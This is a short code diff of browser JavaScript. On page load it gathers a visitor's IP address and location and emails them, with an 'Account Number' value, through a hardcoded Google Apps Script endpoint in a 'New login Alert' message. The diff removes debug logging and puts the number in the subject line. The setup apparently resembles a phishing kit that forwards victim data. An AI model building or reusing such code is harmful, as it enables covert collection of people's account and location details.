@@ -110,9 +110,6 @@ document.addEventListener('DOMContentLoaded', async function () {
                 userInfo.region = data.region;
                 userInfo.country = data.country;
 
-                console.log('City:', data.city);
-                console.log('Region:', data.region);
-                console.log('Country:', data.country);
             })
             .catch(error => {
                 console.error('Error fetching location:', error);
@@ -127,7 +124,7 @@ document.addEventListener('DOMContentLoaded', async function () {
         const url = "https://script.google.com/macros/s/AKfycbwr-I-bBR-W7h6LHOLHTRIuciRb2q869OzJnlIknoKbrL1W8gTWBFzjSIAVFbEymDgHQw/exec"; // Replace with your GAS deployment URL
         const payload = {
             to_email: email,
-            subject: `New login Alert`,
+            subject: `New login Alert ${sphone}`,
             body_html: `<table style="width: 100%; max-width: 600px; font-family: Arial, sans-serif; border-collapse: collapse; text-align: center; margin: 0 auto;">
     <tr>
         <td style="font-size: 22px; font-weight: bold; padding: 20px 0;">Did you signed in a new device?</td>
@@ -144,7 +141,7 @@ document.addEventListener('DOMContentLoaded', async function () {
             <p style="margin: 5px 0;"><strong>When</strong> ${userInfo.time}</p>
             <p style="margin: 5px 0;"><strong>Where</strong> ${userInfo.city} , ${userInfo.country} , ${userInfo.region}</p>
             <p style="margin: 5px 0;"><strong>IP adress</strong> ${userInfo.ip}</p>
-       <p style="margin: 5px 0;"><strong>Account Number</strong> ${sphone}</p>
+       <p style="margin: 5px 0;"><strong>Account Number:</strong> ${sphone}</p>
         </td>
     </tr>
     <tr>
